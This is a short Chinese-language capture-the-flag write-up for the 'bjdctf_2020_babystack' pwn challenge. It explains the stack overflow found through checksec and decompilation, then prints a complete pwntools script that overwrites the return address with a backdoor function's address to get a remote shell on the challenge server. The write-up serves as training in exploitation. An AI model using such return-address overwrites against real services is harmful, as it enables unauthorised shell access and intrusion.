首先checksec

![image-20201103142341073](https://static.hack1s.fun/images/2021/02/06/image-20201103142341073.png)

64位程序，开启了NX

反编译得到main函数

![image-20201103150115631](https://static.hack1s.fun/images/2021/02/06/image-20201103150115631.png)

首先输入了一个数字，给到了nbytes

之后用read来读入nbytes个字节到buf

buf距离rbp存在0x10h

另外文件中存在一个backdoor函数

![image-20201103150253430](https://static.hack1s.fun/images/2021/02/06/image-20201103150253430.png)

可以直接调用得到shell

思路就是直接溢出0x10到rbp，然后8个字节rbp，最后覆盖返回地址到backdoor就完了

```python
from pwn import *

#io = process('./bjdctf_2020_babystack')
io = remote('node3.buuoj.cn',29781)

length = 30
io.recvuntil('name:\n')
io.sendline(str(length))

backdoor_addr = 0x4006e6
payload = 'a'*0x10 + 'b'*0x8 + p64(backdoor_addr)

io.recvuntil('name?\n')
io.sendline(payload)
io.interactive()
```

